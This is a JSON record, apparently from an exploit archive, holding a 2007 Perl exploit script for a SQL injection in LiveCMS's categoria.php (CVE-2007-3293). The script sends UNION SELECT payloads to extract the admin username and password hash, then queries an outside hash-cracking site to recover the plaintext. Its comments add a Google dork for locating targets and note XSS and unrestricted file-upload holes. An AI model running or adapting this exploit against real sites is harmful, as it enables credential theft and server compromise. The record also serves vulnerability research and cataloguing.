{
  "id": "4082",
  "title": "LiveCMS 3.4 - &#039;categoria.php?cid&#039; SQL Injection",
  "cve": "CVE-2007-3293",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n##############################################################################################\r\n#         ___   ___                         _\r\n#        / _ \\ / _ \\                       | |\r\n#   __ _| | | | | | |_ __  ___   _ __   ___| |_\r\n#  / _` | | | | | | | '_ \\/ __| | '_ \\ / _ \\ __|\r\n# | (_| | |_| | |_| | | | \\__ \\_| | | |  __/ |_\r\n#  \\__, |\\___/ \\___/|_| |_|___(_)_| |_|\\___|\\__|\r\n#   __/ |\r\n#  |___/\r\n###############################################################################################\r\n#INFO:\r\n#Program Title ################################################################################\r\n#LiveCMS <= 3.4 SQL Injection, Absolute Path Disclosure, XSS Injection, Arbitrary File Upload\r\n#\r\n#Description ##################################################################################\r\n#This is a free CMS system.\r\n#\r\n#Script Download ##############################################################################\r\n#http://sourceforge.net/project/downloading.php?group_id=78735&use_mirror=ufpr&filename=livecms-3.4.tar.gz&12060460\r\n#http://livecms.com\r\n#\r\n#Original Advisory #############################################################################\r\n#http://www.g00ns-forum.net/showthread.php?t=9350\r\n#\r\n#Exploit #######################################################################################\r\n#credz to Vipsta and Clorox for vulnerability\r\n#[c]ode by TrinTiTTY (2007) www.g00ns.net\r\n#shoutz: z3r0, milf, blackhill, godxcel, murderskillz, katalyst, SyNiCaL, OD, pr0be, rezen, str0ke,\r\n#fish, rey, canuck, c0ma, sick, trin, a59, seven, fury, <S>, Bernard, and everyone else at g00ns.net\r\n#\r\n#Details #######################################################################################                              \r\n#APD: The absolute path is disclosed in a mysql error when categoria.php's paramater cid is queried with a non-defined\r\n#variable. example: categoria.php?cid='\r\n#XSS: Article names are not properly santised, a user could insert malicious javascript\r\n#AFU: Articles can have a small image that is uploaded with them, however LiveCMS fails to restrict what file types\r\n#can be uploaded.  A user could upload a malicious script with this method and compromise the server.\r\n#GoogleDork: \"powered by livecms\"\r\n#\r\n################################################################################################\r\n#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#\r\n#                LiveCMS <= 3.3  [ categoria.php ]               #\r\n#                    ] Remote SQL Injection [                    #\r\n#                                                                #\r\n#              [c]ode by TrinTiTTY [at] g00ns.net                #\r\n#              Vulnerability by Vipsta and Clorox                #\r\n#                                                                #\r\n#                                                                #\r\n#  [irc.g00ns.net]       [www.g00ns.net]        [ts.g00ns.net]   #\r\n#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#\r\n\r\nuse LWP;\r\n\r\n$host = @ARGV[0];\r\n$ua = LWP::UserAgent->new;\r\n\r\nmy $uject ='categoria.php?cid=1%20UNION%20ALL%20SELECT%201,2,user,4,5,6%20FROM%20live_admin%20WHERE%20userid=1/*';\r\nmy $pject ='categoria.php?cid=1%20UNION%20ALL%20SELECT%201,2,pass,4,5,6%20FROM%20live_admin%20WHERE%20userid=1/*';\r\n\r\nif (@ARGV < 1){&top( );&usage( )}\r\nelsif ($host =~ /http:\\/\\//){print\"\\n\\n [-] Don't use http:// in host\\n\";exit( 0 );}\r\nelse { &getUser( ) }\r\n\r\n\r\n\r\nsub getUser( ) {\r\n  system(\"color 4\");\r\n  &top( );\r\n  print \"\\n [~] Retrieving admin username\\n\";\r\n  $nameres = $ua->get(\"http://$host/$uject\");\r\n\r\n  $namecon = $nameres->content;\r\n\r\n  if ($namecon =~ /<td>(.*)a href=\\\"(.*)\\\"(.*)>(.*)<\\/a><\\/td>/gmi)\r\n  {\r\n     $user = $4;\r\n     print \"\\n [+] Admin user retrieved: $user\\n\";\r\n     print \"\\n [~] Retrieving password for $user\\n\";\r\n     getPass( )\r\n  }\r\n  else {\r\n      print \"\\n [-] Unable to retrieve admin username\\n\";\r\n      print \"\\n [~] Retrieving password\\n\";\r\n      getPass( )\r\n  }\r\n}\r\n\r\nsub getPass( ) {\r\n\r\n  $passres = $ua->get(\"http://$host/$pject\");\r\n\r\n  $passCon = $passres->content;\r\n\r\n  if ($passCon =~ /<td>(.*)a href=\\\"(.*)\\\"(.*)>([a-f0-9]{32})<\\/a><\\/td>/gmi)\r\n  {\r\n     $pass = $4;\r\n     print \"\\n [+] Admin password retrieved: $pass\\n\";\r\n     &resolveHash($pass);\r\n     system(\"color 7\");\r\n  }\r\n  else {\r\n      print \"\\n [-] Unable to retrieve admin password\\n\";\r\n      system(\"color 7\");\r\n      exit(0);\r\n  }\r\n}\r\n\r\nsub resolveHash($)\r\n{\r\n  print \"\\n [~] Attempting to resolve hash\\n\";\r\n  $hashget = LWP::UserAgent->new;  #thx gdata\r\n  $resp = $hashget->get(\"http://gdataonline.com/qkhash.php?mode=txt&hash=$_[0]\"); # checks gdata for hash\r\n  $hashans = $resp->content;\r\n  if ($hashans =~ m\\width=\"35%\"><b>([  -_a-z0-9.*?&=;<>/\"\"]{1,25})</b></td>\\){\r\n     $crack = $1;\r\n     print \"\\n [+] Password hash resolved: $crack\\n\";\r\n     system(\"color 7\");\r\n     exit(0);\r\n  }\r\n  else {\r\n     print \"\\n [-] Couldn't resolve hash\\n\";\r\n     system(\"color 7\");\r\n     exit(0);\r\n  }\r\n}\r\nsub top( )\r\n{\r\n  print q {\r\n  ##################################################################\r\n  #                LiveCMS <= 3.3  [ categoria.php ]               #\r\n  #                    ] Remote SQL Injection [                    #\r\n  #                                                                #\r\n  #                [c]ode by TrinTiTTY [at] g00ns.net              #\r\n  #                Vulnerability by Vipsta and Clorox              #\r\n  ##################################################################\r\n  }\r\n}\r\nsub usage( )\r\n{\r\n  print \"\\n Usage: perl livecms33.pl <host>\\n\";\r\n  print \"\\n Example: perl livecms33.pl www.example.com/path\\n\\n\";\r\n  exit(0);\r\n}\r\n\r\n# milw0rm.com [2007-06-20]",
  "url": "https://www.exploit-db.com/exploits/4082"
}